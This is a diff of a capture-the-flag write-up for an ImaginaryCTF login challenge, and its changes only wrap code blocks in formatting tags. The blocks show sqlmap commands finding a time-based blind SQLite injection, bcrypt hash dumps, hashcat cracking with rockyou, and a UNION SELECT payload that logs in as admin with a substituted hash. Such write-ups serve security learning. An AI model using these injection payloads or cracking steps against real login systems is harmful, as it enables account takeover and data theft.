@@ -28,12 +28,15 @@ Try to login with `admin:admin` and get `Invalid username or password`.
 
 View page source and find a comment.
 
+{% code overflow="wrap" %}
 ```html
 <!-- /?source -->
 ```
+{% endcode %}
 
 Aight so let's check http://login.chal.imaginaryctf.org/?source
 
+{% code overflow="wrap" %}
 ```php
 $flag = $_ENV['FLAG'] ?? 'jctf{test_flag}';
 $magic = $_ENV['MAGIC'] ?? 'aabbccdd11223344';
@@ -62,6 +65,7 @@ if ($username && $password) {
     }
 }
 ```
+{% endcode %}
 
 So the `$flag` will be appended to the `$password` if we provide the correct `$magic` value as a GET parameter, e.g. http://login.chal.imaginaryctf.org/?aabbccdd11223344
 
@@ -71,36 +75,45 @@ As the `$msg` indicates, logging in as the admin will not provide the flag. It w
 
 I go straight for `sqlmap`, feeding the POST login request as a file.
 
+{% code overflow="wrap" %}
 ```bash
 sqlmap -r new.req --batch
 ```
+{% endcode %}
 
 We quickly find our vuln.
 
+{% code overflow="wrap" %}
 ```bash
 Parameter: username (POST)
     Type: time-based blind
     Title: SQLite > 2.0 AND time-based blind (heavy query)
     Payload: username=admin' AND 7431=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2))))-- bqUp&password=admin
 ```
+{% endcode %}
 
 Let's exploit it to get the admin's password, then we can login and get the magic value! Start off finding the tables.
 
+{% code overflow="wrap" %}
 ```bash
 sqlmap -r new.req --batch --tables
 +-------+
 | users |
 +-------+
 ```
+{% endcode %}
 
 Now we can use `--columns` to narrow it down further.
 
+{% code overflow="wrap" %}
 ```bash
 sqlmap -r new.req --batch -T users --columns
 ```
+{% endcode %}
 
 However, I decided to guess instead.
 
+{% code overflow="wrap" %}
 ```bash
 sqlmap -r new.req --batch -T users -C password --dump
 +----------+
@@ -110,9 +123,11 @@ sqlmap -r new.req --batch -T users -C password --dump
 | <blank>  |
 +----------+
 ```
+{% endcode %}
 
 Guess we need `pwhash` instead, then we can crack it.
 
+{% code overflow="wrap" %}
 ```bash
 sqlmap -r new.req --batch -T users -C pwhash --dump
 +--------------------------------------------------------------+
@@ -122,34 +137,43 @@ sqlmap -r new.req --batch -T users -C pwhash --dump
 | $2y$10$Is00vB1hRNHYBl9BzJwDouQFCU85YyRjJ81q0CX1a3sYtvsZvJudC |
 +--------------------------------------------------------------+
 ```
+{% endcode %}
 
 Let's confirm the hash type.
 
+{% code overflow="wrap" %}
 ```bash
 hashid '$2y$10$vw1OC907/WpJagql/LmHV.7zs8I3RE9N0BC4/Tx9I90epSI2wr3S.'
 [+] Blowfish(OpenBSD)
 [+] Woltlab Burning Board 4.x
 [+] bcrypt
 ```
+{% endcode %}
 
 We check the mode in hashcat and put the hashes into a file called "hash".
 
+{% code overflow="wrap" %}
 ```bash
 hashcat -h | grep -i blowfish
 3200 | bcrypt $2*$, Blowfish (Unix
 ```
+{% endcode %}
 
 Time to crack (I have the rockyou.txt wordlist in an environment variable)!
 
+{% code overflow="wrap" %}
 ```bash
 hashcat -m 3200 hash $rockyou
 ```
+{% endcode %}
 
 It said it would take 2 days in my VM so I switched to windows (GPU), reduced time to ~10 hours.
 
+{% code overflow="wrap" %}
 ```bash
 hashcat.exe -m 3200 hashes/hashes.txt wordlists/rockyou.txt
 ```
+{% endcode %}
 
 Not likely to be intended lol. I guess we could half the time by only trying to crack the admin password. I ran SQLMap again and dumped the users; `guest` and `admin`.
 
@@ -161,37 +185,47 @@ Nope, didn't work for me. Maybe [SQL Injection with password_verify()](https://s
 
 It looks good! According to [this answer](https://stackoverflow.com/a/50788242) we can select a username, along with a "fake" password hash of our choice.
 
+{% code overflow="wrap" %}
 ```sql
  SELECT * FROM table
  WHERE Username = 'xxx'
  UNION SELECT 'root' AS username, '$6$ErsDojKr$7wXeObXJSXeSRzCWFi0ANfqTPndUGlEp0y1NkhzVl5lWaLibhkEucBklU6j43/JeUPEtLlpRFsFcSOqtEfqRe0' AS Password'
 ```
+{% endcode %}
 
 Took some trial and error but eventually:
 
+{% code overflow="wrap" %}
 ```sql
 guest' UNION SELECT 'admin', '$2y$10$vw1OC907/WpJagql/LmHV.7zs8I3RE9N0BC4/Tx9I90epSI2wr3S.' AS pwhash --
 ```
+{% endcode %}
 
 So the full SQL statement on the backend will look like.
 
+{% code overflow="wrap" %}
 ```sql
 $res = $db->querySingle("SELECT username, pwhash FROM users WHERE username = 'guest' UNION SELECT 'admin', '$2y$10$vw1OC907/WpJagql/LmHV.7zs8I3RE9N0BC4/Tx9I90epSI2wr3S.' AS pwhash --'", true);
 ```
+{% endcode %}
 
 Essentially, it's grabbing the `admin` user along with the `guest` password hash (which we know translates to `guest`). We login (username set to our SQLi payload and the password is `guest`). Our `magic` value is in the source!
 
+{% code overflow="wrap" %}
 ```html
 Welcome admin! But there is no flag here :P<!-- magic: 688a35c685a7a654abc80f8e123ad9f0 -->
 ```
+{% endcode %}
 
 Now we know that visiting http://login.chal.imaginaryctf.org/?688a35c685a7a654abc80f8e123ad9f0 will trigger the following code, appending the flag to the password.
 
+{% code overflow="wrap" %}
 ```php
 if (isset($_GET[$magic])) {
     $password .= $flag;
 }
 ```
+{% endcode %}
 
 Note: I didn't finish this challenge but let me finish the writeup for the sake of completion.
 
